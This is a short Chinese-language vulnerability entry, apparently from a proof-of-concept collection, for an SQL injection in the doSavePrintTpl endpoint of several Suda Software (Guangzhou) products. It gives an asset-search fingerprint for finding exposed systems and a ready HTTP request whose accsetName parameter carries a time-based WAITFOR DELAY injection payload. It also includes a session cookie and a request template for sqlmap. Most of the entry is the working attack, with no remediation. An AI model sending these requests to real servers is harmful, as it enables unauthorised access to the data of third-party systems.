# 速达软件技术（广州）有限公司多款产品doSavePrintTpl存在SQL注入漏洞

- **系统**：速达软件技术（广州）有限公司多款产品　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="速达软件技术（广州）有限公司"`
- **请求**：`GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=1&accsetName=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&modId=1 HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=95EE3D005EFC17F6D1246339EA7617CB`

**请求体 / payload**
```

sqlmap
GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=1&accsetName=1&modId=1 HTTP/1.1
Host:
Cookie: JSESSIONID=95EE3D005EFC17F6D1246339EA7617CB
```

**其他**
- 速达软件技术（广州）有限公司多款产品doSavePrintTpl存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 速达软件技术（广州）有限公司多款产品